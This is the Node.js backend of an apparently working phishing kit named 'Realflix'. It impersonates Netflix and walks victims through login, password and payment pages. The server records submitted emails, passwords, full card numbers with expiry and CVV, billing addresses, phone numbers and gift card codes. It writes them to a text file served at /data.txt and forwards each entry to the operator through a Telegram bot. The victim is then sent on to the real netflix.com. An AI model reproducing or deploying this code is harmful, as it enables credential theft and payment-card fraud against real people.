const http = require('http');
const fs   = require('fs');
const path = require('path');
const https = require('https');

// Load .env file manually since we're not using npm packages
if (fs.existsSync('.env')) {
  const envContent = fs.readFileSync('.env', 'utf8');
  envContent.split('\n').forEach(line => {
    const [key, ...valueParts] = line.split('=');
    if (key && valueParts.length > 0) {
      process.env[key.trim()] = valueParts.join('=').trim();
    }
  });
}

const PORT       = 5000;
const DATA_FILE  = path.join(__dirname, 'data.txt');
const PUBLIC_DIR = __dirname;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram credentials not set. Skipping notification.');
    return;
  }

  const data = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  });

  const options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => body += chunk);
    res.on('end', () => {
      if (res.statusCode !== 200) {
        console.error(`Telegram API error: ${res.statusCode} ${body}`);
      }
    });
  });

  req.on('error', (error) => {
    console.error('Telegram request error:', error);
  });

  req.write(data);
  req.end();
}

function parseBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => resolve(Object.fromEntries(new URLSearchParams(body).entries())));
  });
}

function serveFile(res, filePath, contentType) {
  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
}

function timestamp() {
  return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
}

function saveAndRespond(line, label, email, res) {
  fs.appendFile(DATA_FILE, line, (err) => {
    if (err) {
      console.error('Write error:', err);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false }));
    }
    console.log(`Saved [${label}] -> ${email}`);
    
    // Send to Telegram
    const cleanLine = line.replace(/={65}/g, '').trim();
    const telegramMessage = `<b>New ${label} Result</b>\n<code>${cleanLine}</code>`;
    sendTelegramMessage(telegramMessage);

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));
  });
}

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  const url = req.url.split('?')[0];

  // Static HTML file serving
  if (req.method === 'GET') {
    const routes = {
      '/':              'index.html',
      '/index.html':    'index.html',
      '/password.html': 'password.html',
      '/payment.html':  'payment.html',
    };
    if (routes[url]) return serveFile(res, path.join(PUBLIC_DIR, routes[url]), 'text/html');
    if (url === '/data.txt') return serveFile(res, DATA_FILE, 'text/plain; charset=utf-8');
  }

  // POST /login  =>  Step 1: Email + Password
  if (req.method === 'POST' && url === '/login') {
    const b     = await parseBody(req);
    const email = (b.email    || '').trim();
    const pass  = (b.password || '').trim();

    if (!email || !pass) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, message: 'Missing fields' }));
    }

    const div  = '='.repeat(65);
    const line = [
      `\n${div}`,
      ` STEP 1  |  LOGIN`,
      ` Time      : ${timestamp()}`,
      ` Email     : ${email}`,
      ` Password  : ${pass}`,
      `${div}\n`,
    ].join('\n') + '\n';

    return saveAndRespond(line, 'Login', email, res);
  }

  // POST /payment  =>  Step 2: Card or Gift Card
  if (req.method === 'POST' && url === '/payment') {
    const b          = await parseBody(req);
    const loginEmail = (b.loginEmail || '').trim();
    const div        = '='.repeat(65);
    let line;

    if (b.type === 'gift_card') {
      line = [
        `\n${div}`,
        ` STEP 2  |  GIFT CARD`,
        ` Time        : ${timestamp()}`,
        ` Login Email : ${loginEmail}`,
        ` Gift Code   : ${b.giftCode || ''}`,
        `${div}\n`,
      ].join('\n') + '\n';

    } else {
      line = [
        `\n${div}`,
        ` STEP 2  |  CARD PAYMENT`,
        ` Time          : ${timestamp()}`,
        ``,
        ` -- CARD DETAILS --`,
        ` Login Email   : ${loginEmail}`,
        ` Name on Card  : ${b.cardName     || ''}`,
        ` Card Number   : ${b.cardNum      || ''}`,
        ` Expiry        : ${b.cardExp      || ''}`,
        ` CVV           : ${b.cardCvv      || ''}`,
        ``,
        ` -- BILLING INFO --`,
        ` First Name    : ${b.firstName    || ''}`,
        ` Last Name     : ${b.lastName     || ''}`,
        ` Billing Email : ${b.billingEmail || ''}`,
        ` Phone         : ${b.phone        || ''}`,
        ` Street Address: ${b.address      || ''}`,
        ` City          : ${b.city         || ''}`,
        ` PIN / ZIP     : ${b.pinCode      || ''}`,
        ` State         : ${b.state        || ''}`,
        ` Country       : ${b.country      || ''}`,
        `${div}\n`,
      ].join('\n') + '\n';
    }

    return saveAndRespond(line, 'Payment', loginEmail, res);
  }

  res.writeHead(404);
  res.end('Not found');
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\nPort ${PORT} already in use. Run: kill $(lsof -ti:${PORT})\n`);
  } else {
    console.error('Server error:', err.message);
  }
  process.exit(1);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\nRealflix Server  ->  http://localhost:${PORT}`);
  console.log(`Data file        ->  data.txt`);
  console.log(`Flow: index.html -> password.html -> payment.html -> netflix.com\n`);
});